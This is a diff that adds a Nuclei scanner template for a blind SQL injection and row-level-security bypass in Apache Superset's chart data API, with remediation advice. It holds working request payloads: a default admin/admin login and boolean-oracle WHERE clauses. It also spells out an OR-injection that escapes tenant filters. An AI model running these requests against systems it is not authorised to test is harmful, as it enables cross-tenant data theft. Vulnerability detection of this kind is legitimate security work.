@@ -1,0 +1,175 @@
+id: superset-extras-where-blind-sqli
+
+info:
+  name: Apache Superset - Blind SQLi and RLS Bypass via extras.where
+  author: secuwall
+  severity: high
+  description: |
+    The extras.where parameter in Apache Superset's /api/v1/chart/data endpoint
+    accepts arbitrary SQL WHERE clause expressions. sanitize_clause() parses and
+    regenerates the SQL via sqlglot but does not restrict scalar functions
+    (length, ascii, substr), enabling blind boolean data extraction.
+
+    Additionally, the RLS clause is ANDed with extras.where WITHOUT parenthesizing
+    the user input. Because SQL AND binds tighter than OR, injecting a top-level
+    OR escapes the RLS scope entirely:
+      WHERE (rls) AND 1=2 OR org='target'
+      = ((rls) AND 1=2) OR org='target'
+      = FALSE OR org='target'
+    This enables cross-tenant data access.
+    Affects Superset 6.0.0, 6.1.0, and current master.
+  remediation: |
+    1. Parenthesize extras.where: WHERE (rls) AND (extras_where)
+    2. Restrict scalar functions in extras.where via AST allowlist
+    3. Disable extras.where for guest tokens
+  classification:
+    cwe-id: CWE-89,CWE-863
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 7.7
+  tags: sqli,superset,apache,blind,rls-bypass,default-login
+  metadata:
+    max-request: 4
+    verified: true
+    product: apache-superset
+    vendor: apache
+
+# Usage:
+#
+# 1) Auto-login with default creds (admin/admin):
+#   nuclei -t superset-extras-where-blind-sqli.yaml -u https://superset.target.com \
+#     -var ds=1 -var metric=count
+#
+# 2) Custom credentials:
+#   nuclei -t superset-extras-where-blind-sqli.yaml -u https://superset.target.com \
+#     -var username=analyst -var password=Welcome1 -var ds=1 -var metric=count
+#
+# 3) Pre-obtained token (skip login, pass auth header via -H):
+#   nuclei -t superset-extras-where-blind-sqli.yaml -u https://superset.target.com \
+#     -var ds=1 -var metric=count -var skip=true \
+#     -H "Authorization: Bearer eyJhbG..."
+#
+#   nuclei -t superset-extras-where-blind-sqli.yaml -u https://superset.target.com \
+#     -var ds=1 -var metric=count -var skip=true \
+#     -H "X-Guesttoken: eyJhbG..."
+#
+# Detection logic:
+#   TRUE  condition: extras.where = "1=1 AND length(1)>=0"   (rows returned)
+#   FALSE condition: extras.where = "1=1 AND length(1)>=999"  (no rows returned)
+#   If req TRUE returns data and req FALSE returns empty, the blind oracle works.
+
+flow: |
+  if (template["skip"] == "true") {
+    http(3) && http(4);
+  } else {
+    http(1) && http(2) && http(3) && http(4);
+  }
+
+http:
+  # Request 1: Get CSRF token
+  - raw:
+      - |
+        GET /api/v1/security/csrf_token/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    cookie-reuse: true
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        group: 1
+        regex:
+          - '"result"\s*:\s*"([^"]+)"'
+
+  # Request 2: Login with credentials (default: admin/admin)
+  - raw:
+      - |
+        POST /api/v1/security/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-CSRFToken: {{csrf_token}}
+        Referer: {{BaseURL}}/
+
+        {"username":"{{default(username, 'admin')}}","password":"{{default(password, 'admin')}}","provider":"db","refresh":true}
+
+    cookie-reuse: true
+
+    extractors:
+      - type: json
+        name: access_token
+        internal: true
+        json:
+          - '.access_token'
+
+  # Request 3: TRUE condition (scalar function accepted, rows returned)
+  - raw:
+      - |
+        POST /api/v1/chart/data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{access_token}}
+
+        {"datasource":{"id":{{default(ds, '1')}},"type":"table"},"queries":[{"columns":[],"metrics":["{{default(metric, 'count')}}"],"filters":[],"extras":{"having":"","where":"1=1 AND length(1)>=0"},"row_limit":10,"order_desc":true,"time_range":"No filter"}],"result_format":"json","result_type":"full"}
+
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '"rowcount"'
+          - '"data"'
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          - '"rowcount"\s*:\s*[1-9]'
+
+    extractors:
+      - type: regex
+        name: true_rowcount
+        group: 1
+        regex:
+          - '"rowcount"\s*:\s*(\d+)'
+
+  # Request 4: FALSE condition (length(1)>=999 is false, zero rows)
+  - raw:
+      - |
+        POST /api/v1/chart/data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{access_token}}
+
+        {"datasource":{"id":{{default(ds, '1')}},"type":"table"},"queries":[{"columns":[],"metrics":["{{default(metric, 'count')}}"],"filters":[],"extras":{"having":"","where":"1=1 AND length(1)>=999"},"row_limit":10,"order_desc":true,"time_range":"No filter"}],"result_format":"json","result_type":"full"}
+
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '"result"'
+
+      - type: regex
+        part: body
+        regex:
+          - '"rowcount"\s*:\s*0'
+
+    extractors:
+      - type: regex
+        name: false_rowcount
+        group: 1
+        regex:
+          - '"rowcount"\s*:\s*(\d+)'
